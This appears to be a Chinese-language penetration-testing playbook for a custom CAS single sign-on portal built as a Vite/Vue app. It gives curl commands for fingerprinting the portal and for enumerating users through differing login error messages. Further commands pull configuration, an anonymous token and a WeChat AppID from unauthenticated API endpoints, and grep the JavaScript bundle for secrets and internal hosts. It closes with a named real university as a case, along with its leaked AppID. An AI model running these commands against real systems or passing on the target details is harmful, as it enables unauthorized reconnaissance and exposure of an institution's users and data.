# 自定义CAS (Vite SPA / Vue.js) 用户枚举与API信息泄露模式

## 触发条件
- CAS登录页返回Vite SPA HTML(非标准Apereo CAS)
- JS bundle含`/api/base/login`等REST端点
- 主站域名含ywtb/sso/cas前缀

## 指纹识别
```
curl -sk 'https://ywtb.<domain>/authserver/login' | head -5
# 返回: <title>页面跳转中</title> + Vite SPA跳转
curl -sk 'https://ywtb.<domain>/authserver/login' | grep -oP 'src="[^"]*\.js[^"]*"'
# 返回: ./assets/index.xxxxx.js (Vite构建)
```

## 用户枚举 (POST /api/base/login)
```bash
# 存在的账号
curl -sk 'https://ywtb.<domain>/api/base/login' -X POST -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"test"}'
# 返回: {"msg":"登录失败(在校园网外的地方不支持账号密码登录，请使用微信扫码登录！)","code":500}

# 不存在的账号
curl -sk 'https://ywtb.<domain>/api/base/login' -X POST -H 'Content-Type: application/json' \
  -d '{"username":"nonexistent999","password":"test"}'
# 返回: {"msg":"账号不存在","code":500}
```

## 未授权API端点 (GET)
```bash
curl -sk 'https://ywtb.<domain>/api/base/apps'          # 应用列表+角色+分组
curl -sk 'https://ywtb.<domain>/api/base/stats/dept'     # 部门统计(含ID)
curl -sk 'https://ywtb.<domain>/api/base/index_apps'     # 完整应用配置(数十KB)
curl -sk 'https://ywtb.<domain>/api/base/config'         # 系统配置
curl -sk 'https://ywtb.<domain>/api/base/register/config' # 注册配置+匿名token
curl -sk 'https://ywtb.<domain>/api/base/wx/qr_code'     # 微信AppID+state
curl -sk 'https://ywtb.<domain>/api/base/notice/list'    # 通知列表
curl -sk 'https://ywtb.<domain>/api/base/banner/list'    # Banner列表
```

## 密码重置接口 (不可用于枚举)
```bash
curl -sk 'https://ywtb.<domain>/api/base/retrieve/check' -X POST \
  -H 'Content-Type: application/json' -d '{"username":"admin"}'
# 返回: {"msg":"登录账号不存在","code":500}  (无论账号是否存在)
```

## JS Bundle分析
```bash
# 下载主JS bundle
curl -sk 'https://ywtb.<domain>/assets/index.xxxxx.js' > /tmp/bundle.js

# 搜索API端点
grep -oP '"/api/[^"]*"' /tmp/bundle.js | sort -u

# 搜索内部域名/IP
grep -oP 'https?://[a-zA-Z0-9._-]+\.(edu\.cn|local|internal)[^"]*' /tmp/bundle.js | sort -u

# 搜索密钥/token
grep -oP '(appKey|appSecret|appId|secret|token|key|apiKey|clientId)[^a-zA-Z]*["\x27][^"\x27]{8,}["\x27]' /tmp/bundle.js
```

## /api/user/* 端点 (均需认证, 返回401)
/user/loginlog, /user/favorite/list, /user/monitor/list, /user/msg/list,
/user/openapi/token, /user/session/kickout, /user/resetPwd, /user/fileupload,
/user/face, /user/bind, /user/spwd/{check,set,reset,sendEmail} 等

## 案例
- cuit.edu.cn (成都信息工程大学, 2026-06-02)
  - ywtb.cuit.edu.cn, Vue.js 2.7.16, Vite SPA
  - 外网仅微信扫码登录, 校内网支持密码
  - 微信AppID: wx6651bf981310e1a1
